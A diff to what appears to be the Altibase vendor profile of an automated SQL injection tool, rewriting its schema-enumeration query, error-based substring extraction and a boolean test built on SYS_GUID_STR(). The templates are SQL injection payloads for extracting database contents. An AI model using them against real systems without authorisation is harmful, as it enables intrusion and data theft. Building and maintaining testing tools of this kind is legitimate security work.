@@ -11,13 +11,18 @@ resource:
 
  schema:
   database: |
-   select
+   select group_concat(
        '${enclose_value_sql}'
-       || 'system_'
+       || r
        || '${separator_qte_sql}'
        || 0
        || '${enclose_value_sql}'
-       || '${trail_sql}'
+       ,
+       '${separator_cell_sql}'
+   )
+   || '${trail_sql}'
+   /* table sys contains user tables */
+   from (select 'system_'r union select 'sys'r)
    ${limit}
 
   table: |
@@ -93,10 +98,13 @@ strategy:
    (
        select concat(
            '${lead}',
-           substr(
-               (${injection}),
-               ${window.char},
-               ${capacity}
+           nvl(
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               ),
+               '${trail_sql}'
            )
        )
    )
@@ -110,6 +118,7 @@ strategy:
     - Altibase
    orderByErrorMessage:
     - Invalid position value in ORDER BY clause
+   vendorSpecific: 0 != case when ${test} then SYS_GUID_STR() else 0 end
 
  union:
   indices: union select ${indices}
